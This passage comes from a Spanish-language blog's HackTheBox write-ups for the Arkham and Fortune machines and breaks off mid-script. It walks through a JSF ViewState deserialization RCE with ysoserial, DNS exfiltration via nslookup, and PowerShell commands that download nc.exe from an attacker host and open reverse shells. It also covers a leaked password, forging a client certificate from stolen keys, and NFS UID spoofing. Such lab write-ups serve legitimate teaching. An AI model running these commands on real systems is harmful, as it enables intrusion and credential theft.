uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak 8545167 0x82638F Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml 8545963 0x8266AB Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml 8546680 0x826978 Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml 8547139 0x826B43 Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml 8549824 0x8275C0 Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml 8568254 0x82BDBE Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF 8568380 0x82BE3C Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg 8575806 0x82DB3E Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg 8680920 0x8475D8 Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg 9466405 0x907225 End of Zip archive, footer length: 22 [ .. ] 9638621 0x9312DD Copyright string: \u0026#34;copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para\u0026#34; 9962496 0x980400 PDF document, version: \u0026#34;1.4\u0026#34; [ ... ] 9978880 0x984400 XML document, version: \u0026#34;1.0\u0026#34; 9979118 0x9844EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9981952 0x985000 XML document, version: \u0026#34;1.0\u0026#34; 9986048 0x986000 XML document, version: \u0026#34;1.0\u0026#34; 9986286 0x9860EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9988096 0x986800 XML document, version: \u0026#34;1.0\u0026#34; 9988334 0x9868EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9990144 0x987000 XML document, version: \u0026#34;1.0\u0026#34; 9991168 0x987400 XML document, version: \u0026#34;1.0\u0026#34; 9991406 0x9874EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9999360 0x989400 XML document, version: \u0026#34;1.0\u0026#34; 9999598 0x9894EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 10016768 0x98D800 JPEG image data, JFIF standard 1.01 10024960 0x98F800 JPEG image data, JFIF standard 1.01 10041344 0x993800 JPEG image data, EXIF standard 10041356 0x99380C TIFF image data, little-endian offset of first image directory: 8 10057728 0x997800 JPEG image data, JFIF standard 1.01 Dentro del archivo encontramos varios documentos que se refieren a archivos tomcat, imagenes, y archivos xml, descomprimimos los archivos con binwalk.\n1 binwalk -e backup.img Encontramos varios archivos y carpetas, dentro de la carpeta Mask encontramos imagenes y una subcarpeta tomcat-stuff, utilizamos binwalk con las imagenes para verificar que no tengan archivos ocultos dentro.\nNinguna de las imagenes contiene archivos que puedan servirnos, dentro de la carpeta tomcat-stuff encontramos archivos de configuracion.\nDentro de los archivos de configuracion encontramos un backup de uno de ellos web.xml.bak, en su interior vemos la configuracion que tiene la pagina, algunos parametros de la configuracion contienen datos que sirven para encriptar los datos que se reciben y se envian por medio de la pagina web y podemos notar que esta corriendo en apache myfaces.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Faces Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.faces\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt;State saving method: \u0026#39;client\u0026#39; or \u0026#39;server\u0026#39; (=default). See JSF Specification 2.5.2\u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRE\u0026lt;T/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; Website Puerto 8080 Puerto 8080 en http.\nGobuster Considerando que la pagina esta corrriendo en un apache myfaces (web.xml.bak), vamos a utilizar gobuster para buscar directorios y documentos.\nEncontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico /userSubscribe.faces la cual no aparecio con gobuster.\n/userSubscribe.faces Al registrar un correo nos redirige a otra pagina /thankyou.faces con un mensaje de registro.\nViewState - Arkham Al revisar el codigo fuente de userSubscribe.faces encontramos algunos valores pertenecen a javax.faces.ViewState.\nViewState JSF utiliza viewStates para almacenar los datos de la vista, pueden ser \u0026lsquo;almacenados\u0026rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de javax.faces.ViewState, como es el caso de la pagina que encontramos.\nJava Deserialization Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.\nAl intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encriptado.\nJSF ViewState RCE INFO: JSF ViewStates RCE - Vulnerability\nEncontramos un post el cual habla de una vulnerabilidad RCE de ViewState en las implementaciones de JSF como Oracle Mojarra (JSF reference implementation), Apache MyFaces. Existen dos \u0026rsquo;tipos\u0026rsquo; de ViewState, el que se almacena en el servidor y el cliente, ambos son objetos serializados, para que dicha vulnerabilidad sea aprovechada para la ejecucion de comandos deben de cumplirse algunas condiciones, el viewstate no debe de estar encriptado, en el caso de Mojarra el viewstate debe de estar configurado en el cliente, en MyFaces puede estar configurado en el cliente o servidor.\nEn el caso de MyFaces encriptar el ViewState esta por defecto activado, puede ser desactivado para hacer tests configurando el parametro de org.apache.myfaces.USE_ENCRYPTION = false y tambien puede utilizar una contraseña para la encriptacion. Tambien nos dice que por defecto Myfaces utiliza DES como algoritmo de encriptacion y HMAC-SHA1 para autenticar el ViewState. Por defecto el almacenamiento del ViewState esta configurado por el lado del servidor javax.faces.STATE_SAVING_METHOD = server.\nINFO: Secure Your Application\nAlgunos post sobre JAVA Deseralization:\nJava Serialization\nJava Serialization with burp and ysoserial\nDeserialization Vulnerability - $1500\nAhora que sabemos todo esto, podemos volver a nuestro archivo web.xml.bak el cual contiene algunos parametros que pueden ser de utilidad para aprovechar el RCE del ViewState y ejecutar comandos dentro de la maquina.\n1 2 \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt; Tambien tiene una contraseña que es utilizada para encriptar el viewstate.\n1 2 \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; El algoritmo de autenticacion.\n1 2 \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; Mensaje de autenticacion para el algoritmo.\n1 2 \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; StateUtils.java Existen algunas herramientas para explotacion de deserializacion en java como jexboss y ysoserial, tambien existe una version modificada de ysoserial-modified. Al intentar utilizar estas herramientas contra la maquina no funcionan, por el tipo de encriptacion en la configuracion del archivo (web.xml.bak), estas herramientas aprovechan el viewstatate cuando no estan encriptadas.\nPara arkham vamos a utilizar ysoserial-modified para generar un payload y encriptarlo por medio de la clase de apache myfaces, StateUtils.java, esta clase StateUtils.java contiene metodos que pueden construir y reconstruir un valor de viewstate.\nConfiguracion de los campos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 private static final Logger log = Logger.getLogger(StateUtils.class.getName()); //Cambio por HmacSHA1 public static final String macAlgorithm = \u0026#34;HmacSHA1\u0026#34;; //Cambio por MAC_SECRET -\u0026gt; SnNGOTg3Ni0= //public static final String INIT_MAC_SECRET = \u0026#34;MAC_SECRET\u0026#34;; //public static final String INIT_MAC_SECRET_KEY_CACHE = \u0026#34;org.apache.myfaces.MAC_SECRET.CACHE\u0026#34;; //configuracion Local encrypt/decrypt private static final String encodedKey =\u0026#34;SnNGOTg3Ni0=\u0026#34;; private static final byte[] decodedKey = decode(encodedKey.getBytes()); private static final SecretKey secretKey = new SecretKeySpec(decodedKey,\u0026#34;DES\u0026#34;); //configuracion Local encrypt/decrypt private static final String macSecretStr = \u0026#34;SnNGOTg3Ni0=\u0026#34;; private static final byte[] macSecretBytes = decode(macSecretStr.getBytes()); private static final SecretKey macSecretKey = new SecretKeySpec(macSecretBytes, macAlgorithm); private static final String ZIP_CHARSET = \u0026#34;ISO-8859-1\u0026#34;; // String DEFAULT_ALGORITHM = \u0026#34;DES\u0026#34;; private static final String algorithm = \u0026#34;DES\u0026#34;; // String DEFAULT_ALGORITHM_PARAMS = \u0026#34;ECB/PKCS5Padding\u0026#34;; private static final String algorithmParams = \u0026#34;ECB/PKCS5Padding\u0026#34;; private static final byte[] iv = null; Metodos, se eliminan todos los valores ExternalContext, ServletContext:\n1 2 3 4 5 6 7 8 construct(Object object) reconstruct(String string) encrypt(byte[] insecure) encode(byte[] bytes) decrypt(byte[] secure) decode(byte[] bytes) getAsObject(byte[] bytes) getAsByteArray(Object object) Creamos un metodo para enviar nuestro payload:\n1 sendPayload(String viewstatePayload) Para la ejecucion de comandos utilizamos ysoserial-modified.jar para generar un payload:\n1 CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6 Funciona tambien con la version ysoserial.jar, pero se tienen comandos \u0026rsquo;limitados\u0026rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.\nYa que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: nslookup CommonsCollections1 10.10.1X.1X) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos responder).\nAqui se encuentra el codigo:\nCodigo Java - GitHub De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.\nCodigo Python - GitHub RCE - Request DNS Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son CommonsCollections5, CommonsCollections6, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.\nDe igual forma utilizando nslookup podemos saber que usuario somos y que usuarios existen en la maquina, utilizando los siguientes comandos.\nwhoami\n1 //10.10.13.129 \u0026amp; for /f %i in (\u0026#39;whoami\u0026#39;) do nslookup %i 10.10.13.129 dir C:\\Users\n1 //10.10.13.129 \u0026amp; for /f \u0026#34;tokens=1,2,3\u0026#34; %a in (\u0026#39;dir /B \u0026#34;C:\\Users\u0026#34;\u0026#39;) do nslookup %a.%b.%c 10.10.13.129 Shell - Alfred Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (nc.exe) y ejecutar una shell inversa.\nComando: Cambiamos el primer parametro de cmand a \u0026ldquo;powershell\u0026rdquo;.\n1 wget http://10.10.13.129/nc.exe -o C:\\Users\\Public\\nc.exe; C:\\Users\\Public\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.13.129 443 Obtenemos una shell inversa como Alfred y nuestra bandera User.txt.\nUsuarios - Arkham Podemos ver que existen otros dos usuarios Batman y Administrator.\nVemos que Batman pertenece al grupo de Administrators.\nUser - Batman En el directorio C:\\Users\\alfred\\Downloads\\backups encontramos un archivo backup.zip, lo trasladamos a nuestra maquina con netcat.\nAl descomprimirlo nos muestra un archivo .ost de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (Drafts.mbox).\nPara lectura de Drafts.mbox utilizamos mutt.\n1 mutt -Rf Drafts.mbox Encontramos una imagen de cmd con un comando que contiene un usuario y contraseña:\n1 net use G: \\\\10.10.10.10\\gotham /user:batman Zx^#QZX+T!123 Utilizamos powershell para cambiar al usuario(sesion) Batman con el siguiente comando:\n1 2 3 4 $username =\u0026#34;ARKHAM\\batman\u0026#34;; $password = convertto-securestring -AsPlainText -Force -String \u0026#34;Zx^#QZX+T!123\u0026#34;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.\nShell - Batman Para obtener una shell inversa con el usuario Batman vamos a utilizar Invoke-Command para descargar netcat (nc.exe) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.\n1 2 3 4 5 $username = \u0026#39;ARKHAM\\batman\u0026#39;; $password = \u0026#39;Zx^#QZX+T!123\u0026#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -Credential $credential -ComputerName ARKHAM -Command {powershell wget http://10.10.15.2:8081/nc.exe -o C:\\Users\\Batman\\Documents\\nc.exe; powershell C:\\Users\\Batman\\Documents\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.2 445} Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.\nRoot Por alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera root.txt.\n1 cd \\\\10.10.10.130\\C$\\Users\\Administrator\\ ","description":"Arkham de HackTheBox con SO Windows, Encontramos un backup en SMB encriptado con binwalk obtuvimos archivos, uno de ellos es la configuracion de la \"applicacion\", mediante este ultimo explotamos una vulnerabilidad de deserializacion en java utilizando el codigo de Apache MyFaces junto con ysoserial, lo que nos dio acceso a la maquina. Para el movimiento lateral utilizamos powershell con credenciales de borradores de correo electronico dentro de un backup. Finalmente cambiando de recurso compartido localmente logramos acceder a la carpeta del administrador.","id":197,"section":"posts","tags":["smbclient","binwalk","responder","ysoserial","DNS exfil","java deserialization","readpst","mutt","powershell","invoke-command","new-PSSession"],"title":"Hack The Box - Arkham","uri":"https://sckull.github.io/posts/arkham/"},{"content":"\rRealizamos Command Injection en la pagina web lo que nos guió a certificados los cuales utilizamos para generar uno nuevo y acceder a una nueva pagina restringida, la que nos permitía generar claves SSH para Authpf, con este ultimo encontramos el puerto NFS que nos permitió obtener acceso por SSH. Finalmente encontramos y crackeamos un hash de una base de datos para escalar privilegios.\nInformacion de la Maquina Nombre Fortune OS Other Puntos 50 Dificultad Insane IP 10.10.10.127 Maker AuxSarge\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.1, 7.7, 4.3, 5.7, 2.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 9, 1, 9, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Al realizar un escaneo con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127 Nmap scan report for 10.10.10.127 Host is up (0.17s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA) | 256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA) |_ 256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519) 80/tcp open http OpenBSD httpd |_http-server-header: OpenBSD httpd |_http-title: Fortune 443/tcp open ssl/https? |_ssl-date: TLS randomness does not represent time No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=3/13%OT=22%CT=1%CU=40048%PV=Y%DS=2%DC=T%G=Y%TM=5C89893 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=RD%CI=RI%TS=22)OPS(O OS:1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6NNT11% OS:O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W OS:5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=Y%DF=Y OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=S%F OS:=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=A%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y OS:%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%UN=0%RI OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N) HTTPS Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.\nHTTP Con gobuster encontramos la siguiente ruta.\n1 /fortune (Status: 301) Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.\nY encontramos que, al editar las peticiones (POST db=fortunes), encontramos que podemos ejecutar comandos (RCE):\nAl realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario bob (/home/bob/) certificados que pueden pertenecen a la pagina web https.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /home/bob ├── ca │ ├── certs │ │ └── ca.cert.pem │ ├── crl │ ├── index.txt │ ├── index.txt.attr │ ├── index.txt.old │ ├── intermediate │ │ ├── certs │ │ │ ├── ca-chain.cert.pem │ │ │ ├── fortune.htb.cert.pem │ │ │ └── intermediate.cert.pem │ │ ├── crl │ │ ├── crlnumber │ │ ├── csr │ │ │ ├── fortune.htb.csr.pem │ │ │ └── intermediate.csr.pem │ │ ├── index.txt │ │ ├── index.txt.attr │ │ ├── newcerts │ │ │ └── 1000.pem │ │ ├── openssl.cnf │ │ ├── private │ │ │ ├── fortune.htb.key.pem │ │ │ └── intermediate.key.pem │ │ ├── serial │ │ └── serial.old │ ├── newcerts │ │ └── 1000.pem │ ├── openssl.cnf │ ├── private [error opening dir] │ ├── serial │ └── serial.old └── dba └── authpf.sql La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.\ncertsuperior - Certificados\nOracle - certificados\nPara poder acceder a la pagina debemos de crear nuestro archivo pkc12 el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos intermediate.cert.pem e intermediate.key.pem, utilizando openssl generamos el certificado con el siguiente comando:\nssl - Certificate File\nibm - Certificate\n1 openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.\nVisitamos la pagina en https y nos muestra lo siguiente:\nAl visitar la pagina /generate nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.\nNos conectamos al servicio ssh con la clave generada y el usuario nfsuser, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:\nAl revisar los procesos que corren en la maquina nos muestra un servicio de authpf:\nSegun la documentacion de openbsd sobre Authpf nos dice que \u0026ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que \u0026ldquo;los usuarios se deben autenticar ante la pasarela\u0026rdquo; antes de que se permita que pase el tráfico a través de ésta\u0026rdquo;.\nopenbsd - authpf\nautphf - español\nLas reglas de authpf /etc/authpf/authpf.rules nos muestran que cualquier usuario ip ($user_ip) en este caso nfsuser le de paso o permiso en los protocolos tcp udp.\n1 2 ext_if = \u0026#34;em0\u0026#34; pass in quick on $ext_if inet proto { tcp udp } from $user_ip to ($ext_if) keep state Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-21 04:58 GMT Nmap scan report for 10.10.10.127 Host is up (0.18s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) 80/tcp open http OpenBSD httpd 111/tcp open rpcbind 2 (RPC #100000) 443/tcp open ssl/https? 2049/tcp open nfs 2-3 (RPC #100003) 8081/tcp open http OpenBSD httpd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.31 seconds Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio rpcbind:\nRPCBIND Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127 program vers proto port service 100000 2 tcp 111 portmapper 100000 2 udp 111 portmapper 100005 1 udp 694 mountd 100005 3 udp 694 mountd 100005 1 tcp 944 mountd 100005 3 tcp 944 mountd 100003 2 udp 2049 nfs 100003 3 udp 2049 nfs 100003 2 tcp 2049 nfs 100003 3 tcp 2049 nfs root@sckull:~/htb/fortune# NFS Al revisar los puntos compartidos obtenemos que /home puede ser montado\n1 2 3 4 root@sckull:~/htb/fortune# showmount -e 10.10.10.127 Export list for 10.10.10.127: /home (everyone) root@sckull:~/htb/fortune# ACCESO a /home Para acceder a la carpeta /home debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.\n1 2 3 4 root@sckull:~/htb/fortune# mkdir tmp_nfs root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs root@sckull:~/htb/fortune# ls tmp_nfs/ bob charlie nfsuser Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y nfsuser:\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/ total 16K drwxr-xr-x 2 1002 1002 512 Nov 3 02:39 . drwxr-xr-x 5 root root 512 Nov 3 01:19 .. -rw-r--r-- 1 1002 1002 771 Oct 11 20:18 .cshrc -rw-r--r-- 1 1002 1002 101 Oct 11 20:18 .cvsrc -rw-r--r-- 1 1002 1002 359 Oct 11 20:18 .login -rw-r--r-- 1 1002 1002 175 Oct 11 20:18 .mailrc -rw-r--r-- 1 1002 1002 215 Oct 11 20:18 .profile -rw-r--r-- 1 1002 1002 87 Oct 11 20:18 .Xdefaults root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/ ls: cannot open directory \u0026#39;tmp_nfs/charlie/\u0026#39;: Permission denied root@sckull:~/htb/fortune# Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que /home/charlie tiene propiedades uid: 1000 y gid:1000.\n1 2 3 4 5 6 7 8 9 root@sckull:~/htb/fortune# stat tmp_nfs/charlie/ File: tmp_nfs/charlie/ Size: 512 Blocks: 4 IO Block: 32768 directory Device: 31h/49d\tInode: 27648 Links: 3 Access: (0750/drwxr-x---) Uid: ( 1000/ UNKNOWN) Gid: ( 1000/ UNKNOWN) Access: 2019-03-21 05:17:35.827314870 +0000 Modify: 2019-03-21 05:33:05.655948328 +0000 Change: 2019-03-21 05:33:05.655948328 +0000 Birth: - Creamos un usuario y grupo local para charlie:\n1 2 3 root@kali:~# groupadd --gid 1000 charlie_group root@kali:~# useradd --uid 1000 --groups charlie_group charlie_user root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie Con ello logramos acceder y obtener tambien nuestra bandera user.txt.\nAhora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a authorized_keys para poder logearnos con el servicio ssh como charlie.\nDe la misma forma para el usuario bob:\nESCALACION DE PRIVILEGIOS Dentro de la carpeta charlie nos encontramos con un archivo mbox, que contiene un mensaje de bob para charlie.\nNos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo pgadmin4.db que contiene tablas que le pertenecen a pgadmin3.4, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario dba especificamente en la tabla de server, tambien una tabla que contiene usuario y contraseña de bob y charlie.\nRuta del archivo:\n1 /var/appsrv/pgadmin4/pgadmin4.db Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo pgadmin4.ini:\ndba\nbob y charlie\nUsuario ROOT En la ruta de pgadmin4 local (/usr/local/pgadmin4/pgadmin4-3.4/web/utils/), encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (encrypt(), decrypt(), pad(), pqencryptpassword()), la funcion de encrypt() necesita un texto y una clave, la funcion decrypt() el texto encriptado (ciphertext) anteriormente con la funcion encrypt() y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario dba, podemos intentar desencriptarla solo nos falta la clave (key).\nDentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -\u0026gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -\u0026gt; users) y contraseñas (tabla -\u0026gt; users).\nLocalmente agregamos el siguiente codigo a nuestro archivo crypto.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if __name__ == \u0026#39;__main__\u0026#39;: list_keys = [\u0026#39;root\u0026#39;,\u0026#39;operator\u0026#39;,\u0026#39;www\u0026#39;,\u0026#39;postgresql\u0026#39;,\u0026#39;pgadmin4\u0026#39;,\u0026#39;fortune\u0026#39;,\u0026#39;charlie\u0026#39;, \u0026#39;bob\u0026#39;,\u0026#39;nfsuser\u0026#39;,\u0026#39;authpf\u0026#39;,\u0026#39;admin\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;pgadmin3\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;bob@fortune.htb\u0026#39;, \u0026#39;charlie@fortune.htb\u0026#39;,\u0026#39;user\u0026#39;,\u0026#39;saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=\u0026#39;, \u0026#39;R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=\u0026#39;,\u0026#39;qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=\u0026#39;, \u0026#39;dba\u0026#39;,\u0026#39;postgres\u0026#39;,\u0026#39;$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ\u0026#39;, 